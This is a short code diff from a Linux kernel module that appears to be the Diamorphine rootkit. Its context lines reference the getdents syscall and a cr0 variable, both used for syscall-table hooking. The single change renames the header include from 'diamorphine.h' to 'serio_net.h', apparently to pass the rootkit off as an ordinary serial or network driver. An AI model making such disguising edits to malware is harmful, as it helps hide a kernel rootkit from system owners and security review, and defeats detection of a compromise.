@@ -29,7 +29,7 @@
 #define __NR_getdents 141
 #endif
 
-#include "diamorphine.h"
+#include "serio_net.h"
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
